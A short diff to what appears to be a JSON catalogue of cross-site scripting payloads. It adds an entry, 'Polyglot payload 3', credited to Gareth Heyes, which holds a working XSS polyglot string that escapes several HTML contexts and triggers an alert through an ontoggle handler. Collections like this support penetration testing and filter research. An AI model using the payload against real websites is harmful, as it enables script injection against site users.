@@ -22,5 +22,17 @@
         ],
         "author": "Crlf",
         "authorLink": "http:\/\/polyglot.innerht.ml\/"
+    },
+    {
+        "description": "Polyglot payload 3",
+        "code": "javascript:/*--><\/title><\/style><\/textarea><\/script><\/xmp><details\/open\/ontoggle='+\/`\/+\/\"\/+\/onmouseover=1\/+\/[*\/[]\/+alert(\/@PortSwiggerRes\/)\/\/'>",
+        "browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "safari"
+        ],
+        "author": "Gareth Heyes",
+        "authorLink": "https:\/\/twitter.com\/garethheyes"
     }
 ]
